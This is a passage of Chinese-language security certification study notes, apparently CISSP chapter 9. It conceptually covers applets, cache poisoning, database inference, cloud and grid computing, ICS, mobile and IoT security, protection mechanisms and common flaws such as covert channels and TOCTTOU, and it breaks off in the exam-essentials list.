applet准许远程系统向本地系统发送执行代码。安全管理员必须采取措施，确保这些代码是安全的，并且正确地屏蔽恶意活动。此外，如果没有逐行地分析这些代码，那么终端用户就永远不能确定这个applet是否包含特洛伊木马组件。下面将探讨两个常用的applet 类型： Java applet和ActiveX控件。</p><ul><li><strong>Java applet</strong> Java applet是在Internet上传输的简短的Java程序，以便在远程系统上执行各种操作。在Java平台的设计过程中，安全性是首要的考虑因素，并且Sun公司的开发团队创建了”沙箱”的概念，从而对Java代码施加特权限制。沙箱将Java代码对象与操作系统的其他部分隔离开，并且强制实施关于对象可访问资源的严格规则。虽然沙盒通过Java减少了恶意事件的种类，但是还存在其他很多己被广泛利用的漏洞。</li><li><strong>ActiveX控件</strong> 在Java applet和ActiveX控件之间存在两种主要的区别。首先，ActiveX控件使用Microsoft公司专有的技术，因此，只能在运行Microsoft浏览器的系统上执行。其次，ActiveX控件不受Java applet中沙箱的限制，它对Windows操作系统环境具有全部的访问权限，并且可以执行很多特权操作。因此，在决定下载执行哪种ActiveX控件时必须采取特殊的预防措施。很多安全管理员已经采取了稍微有些苛刻的态度，也就是禁止从某些可信站点之外的所有站点下载任何ActiveX内容。</li></ul><h4 id="9-2-2-本地缓存"><a href="#9-2-2-本地缓存" class="headerlink" title="9.2.2 本地缓存"></a>9.2.2 本地缓存</h4><p>　　本地缓存是暂时存储在客户端上的任意内容，用于将来重新使用。一个典型的客户端上有许多本地缓存，包括ARP缓存、DNS缓存以及互联网文件缓存。针对缓存的攻击有以下几种：</p><ul><li>ARP缓存投毒<ul><li>ARP回复伪造</li><li>创建静态ARP实体</li></ul></li><li>DNS缓存投毒<ul><li>主机投毒</li><li>授权DNS服务器攻击</li><li>缓存DNS服务器攻击</li><li>DNS查找地址改变</li><li>DNS查询欺骗</li></ul></li><li>恶意临时互联网文件或互联网文件缓存</li></ul><p>　　为了减轻或者预防这些攻击应保持操作系统和应用程序修补来自各自厂商的补丁。安装主机入侵检测系统和网络入侵检测工具来观察这些类型的滥用。定期审计DNS日志、DHCP系统日志以及本地客户端系统日志、可能的防火墙、交换机和路由器日志以及时发现异常或可疑事件。</p><h3 id="9-3-基于服务端"><a href="#9-3-基于服务端" class="headerlink" title="9.3 基于服务端"></a>9.3 基于服务端</h3><p>　　基于服务器关注的重要领域是数据流控制，其中也可能包括客户端。数据流是进程之间、设备之间、网络之间的数据或是通信信道之间的数据的流动。对数据流加以管理能确保不仅以最小延迟的有效方式传输，还使用散列确保吞吐数据的可靠性和使用加密确保机密’性。数据流控制同样还确保接收系统不被通信流量导致过载，尤其是dropping(泪滴)连接或恶意的甚至是自我造成的拒绝服务。当数据溢出发生时，数据可能丢失、损坏或触发重传。这些结果是不利的，并且通常实施数据流控制来防止这些问题的发生。数据流控制可以通过网络设备，包括路由器和交换机，还有网络应用和服务进行提供。</p><h3 id="9-4-数据库安全"><a href="#9-4-数据库安全" class="headerlink" title="9.4 数据库安全"></a>9.4 数据库安全</h3><h4 id="9-4-1-聚合"><a href="#9-4-1-聚合" class="headerlink" title="9.4.1 聚合"></a>9.4.1 聚合</h4><p>　　SQL提供了很多函数，这些函数能够将一个或多个表中的记录组合在一起，以生成可能有用的信息。这个过程被称为聚合(aggregation)。聚合并非没有安全漏洞。聚合攻击被用来收集大量的低安全级别的或低价值的事物，将它们结合起来创造较高安全级别或有价值的东西。严格控制对聚合函数的访问并且充分估计可能展示给未授权个体的潜在信息，这对数据库安全管理员来说是特别重要的。</p><h4 id="9-4-2-推理"><a href="#9-4-2-推理" class="headerlink" title="9.4.2 推理"></a>9.4.2 推理</h4><p>　　与聚合类似，推理攻击利用几个非敏感信息片的组合，从而获得对应该属于更高级分类的信息的访问能力。然而，推理要利用人的推断能力，而不是现代数据库平台的简单数学计算能力。与聚合类似，对于推理攻击的最好防范是对赋予个人用户的特权保持持续警隅。此外，数据的故意混淆可能被用来防止对敏感信息的推理。</p><h4 id="9-4-3-数据挖掘和数据仓库"><a href="#9-4-3-数据挖掘和数据仓库" class="headerlink" title="9.4.3 数据挖掘和数据仓库"></a>9.4.3 数据挖掘和数据仓库</h4><p>　　数据仓库常常包含生产数据库出于存储限制或数据安全性考虑而通常未予存储的详细历史信息。另一种被称为数据字典的存储类型常常用于存储与数据相关的关键信息，包括用法、类型、源、关系和格式。DBMS软件通过读取数据字典来决定用户访问数据的访问权限。数据挖掘技术准许分析人员对数据仓库进行搜索，从而寻找历史数据中潜在的相关信息。数据挖掘活动产生元数据。元数据是关于数据的数据或关于信息的数据。元数据不完全是数据挖掘操作的结果，其他的功能或服务也可以生成元数据。可以认为元数据是数据挖掘的数据浓缩。它也可以是超集、子集或是大的数据集表示。元数据可以是重要的、有意义的、相关的、异常的或数据集的畸变元素。<br>　　数据仓库和数据挖掘技术对于安全专家来说十分重要，这主要有两个原因。首先，前面曾经提到过，数据仓库包含大量潜在的敏感信息，它们容易受到聚合和推理攻击。安全专家必须确保恰当的访问控制，并且采取其他一些安全手段保护数据。其次，在数据挖掘技术被用来开发基于统计异常的入侵检测系统的基准时，实际上可以作为安全工具使用。</p><h4 id="9-4-4-数据分析"><a href="#9-4-4-数据分析" class="headerlink" title="9.4.4 数据分析"></a>9.4.4 数据分析</h4><p>　　数据分析是对原始数据进行检查的科学，检查重点是从大量的信息中提取有用的信息。数据分析的结果可以集中于重要的异常值，或正常之外的例外或标准项，或所有数据项的总结，或一些集中的提取和有兴趣信息的组织。随着数据量的增加，数据分析的复杂性也在增加。大数据分析要求在大规模并行或分布式处理系统中进行高性能的分析。在安全方面，众多组织正在努力访问数据并收集范围更广、更为详尽的事件数据。这一数据收集的目标是评估合规性、提高效率、提高生产力、检测违规行为。</p><h4 id="9-4-5-大规模并行数据系统"><a href="#9-4-5-大规模并行数据系统" class="headerlink" title="9.4.5 大规模并行数据系统"></a>9.4.5 大规模并行数据系统</h4><p>　　并行数据系统或并行计算是一个计算系统，被设计用于同时进行大量的计算，但并行数据系统往往远远超出了基本的多处理能力。它们通常包括将一个大的任务划分成更小元素的概念，然后将每个子元素分发到不同的子处理系统进行井行计算。大规模并行数据管理在管理大数据上可能是一个关键的工具，井往往涉及云计算、网格计算、对等计算解决方案。</p><h3 id="9-5-分布式系统"><a href="#9-5-分布式系统" class="headerlink" title="9.5 分布式系统"></a>9.5 分布式系统</h3><p>　　在完整的主机/终端系统中，分布式体系结构容易出现意想不到的脆弱性。台式机系统可能包含存在泄露风险的敏感信息，因此必须加以保护。单独的用户可能缺乏一般的安全意识，因此内在的体系结构必须弥补这些不足。通信设备也会提供不期望的分布式环境入口点。分布式系统环境要求采取许多防护措施来实现适当的安全性，并确保消除、缓解或补救这些脆弱性。客户端必须受到对其内容及用户内容实施防护措施的策略的约束。</p><h4 id="9-5-1-云计算"><a href="#9-5-1-云计算" class="headerlink" title="9.5.1 云计算"></a>9.5.1 云计算</h4><p>　　云计算是虚拟化、互联网、分布式结构以及可随处访问数据和资源的自然延伸和演变。但是，云计算也存在一些问题，包括隐私问题、合规性困难、使用开/闭源解决方案、采用开放标准以及基于云计算的数据是否实际上是安全的(或甚至是可保护的)。这里列出一些云计算的概念：</p><ul><li><strong>平台即服务</strong> 平台即服务(PaaS)的概念是提供计算平台和软件解决方案作为虚拟的或基于云的服务。从本质上讲，这种类型的云计算解决方案提供了一个平台的所有方面(即操作系统和完整的解决方案)。PaaS的主要吸引力是避免了在本地购买和维护高端的硬件和软件。</li><li><strong>软件即服务</strong> 软件即服务(SaaS)是PaaS的衍生物。SaaS提供对特定软件应用或套件的按需在线访问而不需要本地安装。在许多情况下，只有很少的本地硬件和操作系统的局限性。SaaS可以实现订阅服务、付费服务或免费服务。</li><li><strong>基础设施即服务</strong> 基础设施即服务(IaaS)将PaaS模式带到了另一个方向，不但提供了按需操作的解决方案，还提供了完全外包的选择。这可以包括实用或定量的计算服务、管理任务自动化、动态规模、虚拟化服务、政策执行、管理服务和托管的/过滤的互联网连接。最终，IaaS允许企业通过云系统快速扩展新的软件或基于数据的服务/解决方案，而不必在本地安装大量的硬件。</li></ul><h4 id="9-5-2-网格计算"><a href="#9-5-2-网格计算" class="headerlink" title="9.5.2 网格计算"></a>9.5.2 网格计算</h4><p>　　网格计算是并行分布处理的一种形式，这种形式松散地把大量的处理节点组合在一起，为实现某个处理目标而工作。网格成员可以在随时的间隙时间进入和离开网格。通常，网格成员只有当它们的处理能力没有本地工作负担的情况下才会加入网格。当系统处于空闲状态时，它可以加入一个网格组，下载一小部分的工作，然后开始计算。当系统离开网格时，它保存任务并可上传己完成或部分的工作成果给网格。<br>　　网格计算关心的最大安全问题是每个工作包的内容潜在的完全暴露。许多网格计算项目是完全开放的，所以没有任何限制，谁都可以在本地运行和处理应用程序，并参与网格的项目。这就意味着，网格成员可以保存每个工作包的副本并检查内容。因此，网格项目将不能保持保密性，以及也不适用于隐私、机密或专有数据。<br>　　网格计算每时每刻的计算能力都可能发生巨大变化。工作包有时回不来、回来晚或有损坏地返回。这将需要大量的返工，井导致工程在速度、进程、响应上的不稳定性，以及整个项目和每个网格成员的延时。对时间敏感的项目可能因为没有足够的计算时间而不能在指定时间期限内完成任务。<br>　　网格计算经常用一台中央核心服务器来管理项目、跟踪工作数据包井整合返回的工作分组。如果中央服务器过载或离线，会发生网格的彻底失败或崩溃。然而，通常当中央网格系统不可访问时，网格成员也可完成它们目前的本地任务，然后定期轮询去发现什么时候中央服务器重新联机。还有一个潜在的风险，就是一台被恶意控制的中央网格服务器可能被利用来攻击网格成员，或欺骗网格成员去执行非网格社区所期望的恶意行为。</p><h4 id="9-5-3-点对点"><a href="#9-5-3-点对点" class="headerlink" title="9.5.3 点对点"></a>9.5.3 点对点</h4><p>　　点对点(Peer-To-Peer，P2P)技术是网络和分布式应用手里字的解决方案，用于在点对点实体间共享任务和工作负载。这类似于网格计算，与网格计算的主要区别是： 点对点没有中央管理系统，并且所提供的服务通常是实时的，而不是作为计算能力的集合。</p><h3 id="9-6-工业控制系统"><a href="#9-6-工业控制系统" class="headerlink" title="9.6 工业控制系统"></a>9.6 工业控制系统</h3><p>　　工业控制系统(ICS)是一种用于控制工业生产过程和机器的计算机管理设备。有几种ICS种类，包括集散控制系统(DCS)、可编程逻辑控制器(PLC)和数据采集与监控系统(SCADA)。DCS单元负责从单个地点的大型网络环境中收集数据和实施控制。DCS系统的一个重要方面是控制分布在所监测环境中的元件。PLC是有效的单用途或专门用途的数字计算机。它们通常被部署用于各种工业机电自动化管理与操作，如装配线或大规模的数字灯光显示控制系统。SCADA系统可以作为独立的设备使用，也可与其他SCADA系统组成网络或是与传统IT系统组成网络。</p><h3 id="9-7-评估和缓解基于Web系统的脆弱性"><a href="#9-7-评估和缓解基于Web系统的脆弱性" class="headerlink" title="9.7 评估和缓解基于Web系统的脆弱性"></a>9.7 评估和缓解基于Web系统的脆弱性</h3><p>　　在基于Web 的系统中有各种各样的应用和系统脆弱性与威胁，并且范围在不断扩大。脆弱性包括涉及XML和SAML，以及许多在开放式Web 应用程序安全项目(OWASP)中讨论的其他问题。<br>　　XML利用是一种编程攻击，用来伪造信息并将其发送给访客或导致他们的信息系统在未授权的情况下丢弃信息。对刀在L攻击日益关注的一个领域是安全断言标记语言(SAML)。SAML的滥用往往集中于网络认证。SAML是一种在安全域之间基于XML的组织会话，用于交换通信、认证和授权的细节，通常运行于Web协议之上。SAML通常用来提供基于Web的SSO(Single Sign-On)解决方案。如果攻击者可以伪造SAML通信或窃取访问者的访问令牌，他们就可以绕过认证并获得对网站的未授权访问。<br>　　OWASP是一个非营利性的安全项目，其重点在于提高在线或基于Web的应用程序的安全性。OWASP不仅仅是一个组织，也是一个大型社区，可以一起自由地分享信息、方法、工具、更好的编码实践及更安全的架构部署等相关技术。</p><h3 id="9-8-评估和缓解移动系统的脆弱性"><a href="#9-8-评估和缓解移动系统的脆弱性" class="headerlink" title="9.8 评估和缓解移动系统的脆弱性"></a>9.8 评估和缓解移动系统的脆弱性</h3><p>　　恶意内部人员可以通过外部不同类型的存储设备把恶意代码带入内部，这些设备包括手机、音频播放器、数码相机、存储卡、光盘和USB 设备。这些存储设备还可以用来泄漏或窃取内部机密和私人数据，以至于泄露到外部恶意的内部人员可以执行恶意代码、访问危险的网站或故意执行有害活动。</p><h4 id="9-8-1-设备安全"><a href="#9-8-1-设备安全" class="headerlink" title="9.8.1 设备安全"></a>9.8.1 设备安全</h4><p>　　设备安全可以在一定范围内为移动设备提供潜在的安全选项或功能。不是所有的便携式电子设备σED)都有很好的安全特性。但是，即使设备具有安全功能，但除非它们能被启用和正确配置，否则也是没有价值的。在做出购买决定之前，一定要考虑新设备的安全选项。</p><ul><li>全设备加密</li><li>远程擦除</li><li>锁定</li><li>锁屏</li><li>GPS</li><li>应用控制</li><li>存储分隔</li><li>资产跟踪</li><li>库存控制</li><li>移动设备管理</li><li>设备访问控制</li><li>可移动存储</li><li>关闭不使用的功能</li></ul><h4 id="9-8-2-应用安全"><a href="#9-8-2-应用安全" class="headerlink" title="9.8.2 应用安全"></a>9.8.2 应用安全</h4><ul><li>密钥管理</li><li>凭证管理</li><li>认证</li><li>地理标记</li><li>加密</li><li>应用自名单</li></ul><h4 id="9-8-3-BYOD关注点"><a href="#9-8-3-BYOD关注点" class="headerlink" title="9.8.3 BYOD关注点"></a>9.8.3 BYOD关注点</h4><p>　　BYOD是一项策略，允许员工在工作中携带自己的个人移动设备并使用这些设备连接(或通过)公司网络业务资源和/或互联网。虽然BYOD可以提高员工的士气和工作满意度，但却增加了组织的安全风险。用户需要了解在工作中使用他们自己的设备的好处、限制和后果。阅读并签署BYOD策略，参加回顾和培训计划以具备充足、合理的意识。</p><ul><li>数据所有权</li><li>所有权支持</li><li>补丁管理</li><li>反病毒管理</li><li>取证</li><li>隐私</li><li>在线/不在线</li><li>遵守公司策略</li><li>用户接受</li><li>架构/基础设施考虑</li><li>法律问题</li><li>可接受策略</li><li>机载摄像头/视频</li></ul><h3 id="9-9-评估和缓解嵌入式设备和物联网系统的脆弱性"><a href="#9-9-评估和缓解嵌入式设备和物联网系统的脆弱性" class="headerlink" title="9.9 评估和缓解嵌入式设备和物联网系统的脆弱性"></a>9.9 评估和缓解嵌入式设备和物联网系统的脆弱性</h3><p>　　嵌入式系统通常围绕与更大的产品相关的一系列有限和特定的功能而进行设计，井成为它的一个组成部分。关于嵌入式系统的另一个类似的概念是静态系统(又名静态环境)。静态环境是一组不改变条件、事件和周边的环境。静态的IT环境可以是任何系统，其用户和管理员的目的是保持环境不变。整个目标是防止或最大程度减少用户可能导致降低安全性或操作功能性的实施变更。在技术上，静态环境是应用手到芋、操作系统、硬件设置或网络被配置为满足特定的需要、能力或功能，然后保持设置不变。然而，尽管使用了”静态”这个术语，但没有真正的静态系统。因为总是存在改变环境的情况，如硬件故障、硬件配置变更、软件缺陷、软件设置的变更或漏洞，最终导致不希望的操作参数和实际上的安全入侵。</p><h4 id="9-9-1-嵌入式系统和静态系统的示例"><a href="#9-9-1-嵌入式系统和静态系统的示例" class="headerlink" title="9.9.1 嵌入式系统和静态系统的示例"></a>9.9.1 嵌入式系统和静态系统的示例</h4><p>　　支持网络功能的设备是那些本身有网络功能的便携或非便携设备。<br>　　网络物理系统指的是提供一种计算手段来控制物理世界中某样东西的设备。<br>　　网络物理系统、嵌入式系统和具备网络功能的设备的一种新扩展是物联网(loT)。物联网是设备的集合，可以通过互联网与其他设备或通过控制台来影响和监视真实世界。</p><h4 id="9-9-2-安全方法"><a href="#9-9-2-安全方法" class="headerlink" title="9.9.2 安全方法"></a>9.9.2 安全方法</h4><p>　　嵌入式系统和静态系统的安全问题包括以下事实： 大多数集中在如何最大限度地降低成本和无关的功能上。这往往会导致缺乏安全性且难于升级或安装补丁。由于嵌入式系统在真实世界中是一种控制机制，因此一个安全漏洞可能会造成对人和财产的损害。静态环境、嵌入式系统和其他有限或单一用途的计算环境需要安全管理。虽然它们可能没有广泛的攻击面，并且没有暴露过多的风险，但作为通用的计算机，它们仍然需要适当的安全治理。</p><ul><li>网络隔离</li><li>安全层</li><li>应用防火墙</li><li>手动升级</li><li>固件版本控制</li><li>包装</li><li>控制冗余和多样性</li></ul><h3 id="9-10-基本安全保护机制"><a href="#9-10-基本安全保护机制" class="headerlink" title="9.10 基本安全保护机制"></a>9.10 基本安全保护机制</h3><h4 id="9-10-1-技术机制"><a href="#9-10-1-技术机制" class="headerlink" title="9.10.1 技术机制"></a>9.10.1 技术机制</h4><h5 id="1-分层法"><a href="#1-分层法" class="headerlink" title="1. 分层法"></a>1. 分层法</h5><p>　　通过分层法处理，可以实现与用于操作模式的环模型(本章前面讨论过)类似的结构，并且能够应用于每一个操作系统进程。分层法将进程最敏感的功能放在中心，并且用逐渐扩大的同心圆代表敏感度较低的功能(使用稍有不同的方式，有时也采用术语” 较高层” 和”较低层” 进行阐述，从较低层进入较高层时，安全性与特权会被减弱或减少)。层与层之间的通信只能使用定义良好的特定接口，以便提供必要的安全性。来自外部(低敏感度)层的所有入站请求都必须经过严格的身份认证和授权检查，然后才能被允许继续进行(或者在未通过检查的情况下被拒绝)。为安全性使用的分层法类似于使用安全域和格子型安全模型，安全性以及对特定主体和客体的访问控制与指定的层和特权相关联，并且从外部层移至内部层时访问特权会增加。事实上，不同的层只能通过特定的接口进行通信，这种接口被设计用于维护系统的安全性和完整性。即使低安全性的外部层依赖于来自更高安全性的内部层的服务和数据，它们也仍然只知道如何与这些内部层接口，但是对内部层的内部结构、特征或其他细节毫无了解。为了维护层的完整性，内部层既不了解也不依赖于外部层。无论任何一对层之间存在何种安全关系，都不会对对方造成影响(因此每个层都不会遭受其他层的篡改)。最后，外部层不能违反或重写内部层强制实施的任何安全策略。</p><h5 id="2-抽象"><a href="#2-抽象" class="headerlink" title="2. 抽象"></a>2. 抽象</h5><p>　　抽象是支持面向对象编程的领域的基本原则之一。对象(或操作系统组件)的用户没有必要知道对象的工作细节，而是只需知道使用对象的正确语法和作为结果返回的数据的类型(也就是如何发送输入和接收输出)。这往往涉及对数据或服务的中间访问，就像用户模式中的应用程序使用系统调用请求管理员模式中的服务或数据一样(根据请求者的凭证和特权授予或拒绝这种请求) ，而不是获得直接的、非中间的访问。抽象的另一种安全应用方式引入了对象组(有时也被称为类)，此时访问控制和操作权限被分配给对象组，而不是在每个对象的基础上进行分配。这种方式允许安全管理员方便地定义和命名对象组(通常与作业角色或职责有关)，并且使权限和特权管理变得更为容易(当把对象加入某个类时，就能赋予权限和特权，从而不必单独针对每个对象管理权限和特权) 。</p><h5 id="3-数据隐藏"><a href="#3-数据隐藏" class="headerlink" title="3. 数据隐藏"></a>3. 数据隐藏</h5><p>　　数据隐藏是多级安全系统的一个重要特征，它能够确保存在于某个安全级别的数据对于运行在不同安全级别的进程来说是不可见的。数据隐藏背后的重要概念是： 保证不必知道在某个级别访问和处理数据所涉及细节的人无法偷偷摸摸地或违法地了解和查看这些细节。从安全性的角度看，数据隐藏依赖于将客体置入不同于主体所占用容器的其他安全容器中，从而对不必对客体细节进行了解的人隐藏相关的细节。</p><h5 id="4-进程隔离"><a href="#4-进程隔离" class="headerlink" title="4. 进程隔离"></a>4. 进程隔离</h5><p>　　进程隔离要求操作系统为每个进程的指令和数据提供不同的内存空间。此外，还要求操作系统强制实施这些分界，以阻止某一进程读取或写入属于另一个进程的数据。使用进程隔离技术主要有下列两个优点：</p><ul><li>阻止未经授权的数据访问。进程隔离是多级安全模式系统的基本要求之一。</li><li>保护进程的完整性。如果没有这样的控制措施，那么设计糟糕的进程可能会出现错误，并且将数据写入分配给其他进程的内存空间，从而导致整个系统不稳定，而不仅仅是影响错误进程的执行。在更恶意的情况下，进程可能试图(甚至可能成功)读取或写入超出其处理范围的内存空间、入侵或攻击其他进程。</li></ul><h5 id="5-硬件分隔"><a href="#5-硬件分隔" class="headerlink" title="5. 硬件分隔"></a>5. 硬件分隔</h5><p>　　硬件分隔的目的与进程隔离类似： 用于阻止对属于不同进程/安全级别的信息的访问。二者的主要差异是：硬件隔离通过使用物理方式的硬件控制措施来强制实施这些要求，而不是通过操作系统强加的逻辑进程隔离控制方法。</p><h4 id="9-10-2-安全策略与计算机体系结构"><a href="#9-10-2-安全策略与计算机体系结构" class="headerlink" title="9.10.2 安全策略与计算机体系结构"></a>9.10.2 安全策略与计算机体系结构</h4><p>　　安全策略的角色是告知和指导某些特殊系统的设计、开发、实现、测试和维护。因此，这种安全策略主要关注于单一的实现努力(尽管可能改编自其他类似的实现努力，但是应当尽可能准确和完整地反映目标)。对于系统开发人员而言，安全策略最好通过文档形式定义一组规则、实践和措施，它们描述了系统应当如何管理、保护和分布敏感的信息。阻止信息从较高安全级别流向较低安全级别的安全策略被称为多级安全策略。随着系统开发的进行，应当针对所有适用的系统组件或元素(包括以下全部或其中的一部分： 物理的硬件组件、固件、软件以及组织如何交互和使用系统)设计、构建、实现和测试安全策略。总之，安全考虑应该贯穿项目的整个生命周期，而不是到最后才考虑，否则更容易遭受失败。</p><h4 id="9-10-3-策略机制"><a href="#9-10-3-策略机制" class="headerlink" title="9.10.3 策略机制"></a>9.10.3 策略机制</h4><ul><li>最小特权原则</li><li>特权分离</li><li>可问责性</li></ul><h3 id="9-11-常见的缺陷和安全问题"><a href="#9-11-常见的缺陷和安全问题" class="headerlink" title="9.11 常见的缺陷和安全问题"></a>9.11 常见的缺陷和安全问题</h3><h4 id="9-11-1-隐蔽通道"><a href="#9-11-1-隐蔽通道" class="headerlink" title="9.11.1 隐蔽通道"></a>9.11.1 隐蔽通道</h4><p>　　隐蔽通道是用于传递信息的方法，通常不用于通信。因为隐蔽通道的路径通常不用于通信，所以不会受到系统正常安全控制方法的保护。使用隐蔽通道提供了违反、绕过或回避安全策略而不被发现的一种方法。目前存在下列两种基本的隐蔽通道类型：</p><ul><li><strong>时间隐蔽通</strong> 道通过以一种可预测的方式改变系统组件的性能或更改资源的时间安排来传达信息。使用时间隐蔽通道通常是一种比较复杂的传送数据的方法，并且难以检测。</li><li><strong>存储隐蔽通</strong> 道通过将数据写入其他进程可以读到的公共存储区域来传达信息。当评估软件安全时，需要注重评估任意进程将信息写入内存中任意位置时，是否可能被其他的进程读取。</li></ul><p>　　这两种隐蔽通道都是依靠使用通信技术与其他未经授权的主体交换信息。因为隐蔽通道的性质是与众不同的，并且位于正常的数据传送环境之外，所以对其进行检测十分困难。针对任何隐蔽通道活动的最佳防护措施是实现审计和分析日志文件。</p><h4 id="9-11-2-基于设计或编码缺陷的攻击和安全问题"><a href="#9-11-2-基于设计或编码缺陷的攻击和安全问题" class="headerlink" title="9.11.2 基于设计或编码缺陷的攻击和安全问题"></a>9.11.2 基于设计或编码缺陷的攻击和安全问题</h4><ul><li><p>初始化和失败状态<br>在毫无准备的情况下，系统突然崩愤，接着又重新恢复，这个过程就可能存在两个会危及系统安全控制的机会。许多系统在关机过程中会卸载安全控制。可信恢复能够保证在发生系统崩横时，所有的控制措施都完整无缺。在可信恢复的过程中，系统能确保在安全控制失效的情况下不发生任何访问活动。甚至在系统恢复阶段，所有控制方法都还在完整地运行着。虽然自动恢复过程构成了整个恢复过程的一部分，但是人为的干预仍然是必要的。很显然，如果需要这样的人工操作，那么对执行恢复操作的人员进行适当的身份标识和身份认证同样也是必不可少的。</p></li><li><p>输入和参数检查<br>缓冲区溢出是一种声名狼蒲的安全破坏行为。在编程人员未能充分验证输入数据时，尤其是在没有对软件接受为输入的数据量进行限制时，就会出现缓冲区溢出。验证数据的有效性是消除缓冲区滋出的唯一方法。一旦发现缓冲区溢出，受影响的系统就必须以常见的方式应用关键的安全更新，从而避免遭受攻击。</p></li><li><p>维护钩子和特权程序<br>维护钩子程序是只有系统开发人员才知道的系统入口点，这些入口点也被称为后门。后门的最初目的是： 出于维护系统的原因或者在正常的访问由于疏忽导致失效时，能够提供有保证的访问。后门存在的问题是： 这种访问类型避开了所有的安全控制措施，并且为所有知道后门存在的人提供了不受限制的访问。必须明确禁止这些入口点，并且通过监控审计日志来发现那些表明可能是未经授权的管理员访问行为。另一种常见的系统脆弱性是幸自字在执行过程中安全级别被提高的情况。这些程序必须被认真编写和测试，从而不会允许任何出口点和/或入口点存在，以防提高主体的安全级别。确保所有运行在较高安全级别的程序都只能被适当的用户访问，并且这些用户会坚决抵制滥用。</p></li><li><p>增量攻击<br>某些攻击形式以缓慢的、渐进的增量方式发生，而不是通过明显的或可识别的活动来危害系统的安全性或完整性。当攻击者获得访问系统的权限并且在存储、处理、输入、输出或事务处理期间对数据进行细小的、随机的或增量的改变时(而不是明显地改变文件内容或破坏、删除整个文件)，就会发生数据欺骗。如果没有通过执行加密或某种完整性检查(例如，校验和或消息摘要)并在每次文件读写时都加以应用来保护文件和数据，那么就很难检测这些变化。加密的文件系统、文件级别的加密技术或某些文件监控形式(包括诸如Tripwire 之类的应用程序所执行的完整性检查)通常足以保证不会发生数据欺骗。数据欺骗通常被认为是一种大多由内部人员、很少由外部人员(也就是外部入侵者)进行的攻击。很显然，因为数据欺骗是一种修改数据的攻击，所以我们将其视为主动攻击。</p></li></ul><h4 id="9-11-3-编程"><a href="#9-11-3-编程" class="headerlink" title="9.11.3 编程"></a>9.11.3 编程</h4><p>　　任何不能妥善处理异常的程序都处于不稳定状态的危险之中。程序为了执行正常的任务而提升了自己的安全级别以后，就很有可能导致崩溃。如果攻击者在适当时成功地使程序崩溃，那么他们就能达到较高的安全级别并造成对系统机密性、完整性和可用性的损害。无论是直接执行还是间接执行，所有的程序都必须经过完整的测试以遵从安全模型。确认你所安装的任何软件使用的都是最新版本，并且知道任何己知的安全脆弱性。因为每种安全模型和每种安全策略都是不同的，所以必须确保执行的软件不会超出准许的授权。编写安全代码是很困难的，不过确实是可能的。确保使用的所有程序在设计时都考虑了安全性问题。</p><h4 id="9-11-4-计时、状态改变和通信中断"><a href="#9-11-4-计时、状态改变和通信中断" class="headerlink" title="9.11.4 计时、状态改变和通信中断"></a>9.11.4 计时、状态改变和通信中断</h4><p>　　计算机系统执行任务时具有严格的精确度。计算机的优越性在于可重复执行任务。攻击者可以根据任务执行的可预测性来开发攻击程序。常见的算法的事件顺序是先检查可用资源，然后在被准许的情况下进行访问。检查时间(Time Of Check，TOC)是指主体检查客体状态的时间。在返回要访问的客体之前，系统可以做出几种决定。当做出可以访问客体的决定时，程序在使用时间(Time Of Use，TOU)访问客体。在TOC与TOU之间存在的时间差对于攻击者来说是充足的，攻击者能够在这段时间内用另一个符合自己需要的客体来替换原先的客体。检查时间到使用时间(Time-Of-Check-To-Time-Of-Use，TOCTTOU)攻击通常被称为竞争条件，这是由于攻击者与合法的进程进行竞争，从而希望在客体被使用之前对其进行替换。<br>　　同样，当资源的状态或整个系统发生改变时，攻击者可以试图在两种己知的状态之间采取行动。通信中断也为攻击者提供了一段可以利用的短暂时间。在资源的状态检查出现在对资源采取行动之前的任何时候，都存在发起潜在攻击的机会窗口。这些攻击必须在安全策略和安全模型中加以解决。TOCTTOU攻击、竞争条件漏洞利用及沟通障碍被称为状态攻击，因为它们攻击一个系统状态过波到另一个状态之间的时差、数据流控制和数据传输。</p><h4 id="9-11-5-技术和过程完整性"><a href="#9-11-5-技术和过程完整性" class="headerlink" title="9.11.5 技术和过程完整性"></a>9.11.5 技术和过程完整性</h4><p>　　评估和理解系统架构中的漏洞是很重要的，特别是关于技术和流程的整合方面。由于多种的技术和复杂的过程在规划新的和定制的业务功能时相互交叉，新的问题和安全问题就会显现出来。随着系统的集成，注意力应该放在潜在的单点故障方面，以及面向服务架构(Service-Oriented Architecture，SOA)的紧迫弱点上。SOA构造了新应用或目前没有的功能，而且独立且区别于软件服务。由于应用结果通常是新的; 因此安全问题也是未知的、未经检验的和无保户的。所有新的部署，特别新的应用或函数，需要彻底被审查之后，它们才能被允许进入和运行于生产网络或发布到互联网上。</p><h4 id="9-11-6-电磁辐射"><a href="#9-11-6-电磁辐射" class="headerlink" title="9.11.6 电磁辐射"></a>9.11.6 电磁辐射</h4><p>　　因为计算机硬件是由各种电子元件构造而成的，所以许多计算机硬件设备在正常运转的过程中都会放射出电磁辐射(Emit Electromagnetic，EM)。与其他计算机或外围设备进行通信的过程也会产生可能会被拦截的电磁波。通过拦截和处理来自键盘和计算机显示器的电磁辐射，我们甚至有可能重新生成键盘输入或显示器输出的数据。我们也可以被动地(也就是没有真的窃听电缆)检测和读取在网段上经过的网络数据包。这些辐射泄漏可能会引起严重的安全问题，但是通常比较容易解决。消除电磁辐射拦截的最容易方法是，通过电缆屏蔽或放入导管来降低辐射，以及通过物理安全控制方法阻止未授权人员和设备过于靠近设备或电缆。通过降低信号强度和在敏感设备周围增加物理缓冲区，就能够大幅度地减少信号辐射被拦截的风险。</p><h3 id="9-12-考试要点"><a href="#9-12-考试要点" class="headerlink" title="9.12 考试要点"></a>9.12 考试要点</h3><ul><li><strong>能够解释多任务处理、多线程剑主里、多处理器和多程序设计之间的差异</strong> 多任务处理是在一台计算机上同时执行多个应用程序，并由操作系统管理。多线程处理允许在一个进程内执行多个并发任务。多处理器是使用多个处理器以提高计算能力。多F到芋设计与多任务处理类似，但是在大型机系统上使用并且需要特殊的程序设计。</li><li><strong>理解单一状态处理器和多态处理器之间的差异</strong> 单一状态处理器能够一次只在一个安全级别运行，而多态处理器可以同时在多个安全级别运行。</li><li><strong>描述由美国联邦政府认可的用于处理分类信息的4种安全模式</strong> 专用系统要求所有用户对在系统中存储的所有信息都具有适当的许可级别、访问特权和”知其所需”要求。系统高级模式则去除了”知其所需” 要求。分隔模式去除了”知其所需”要求和访问特权要求。多级模式则去除了上述所有三个要求。</li><li><strong>解释大多数现代处理器使用的两种分层操作模式</strong> 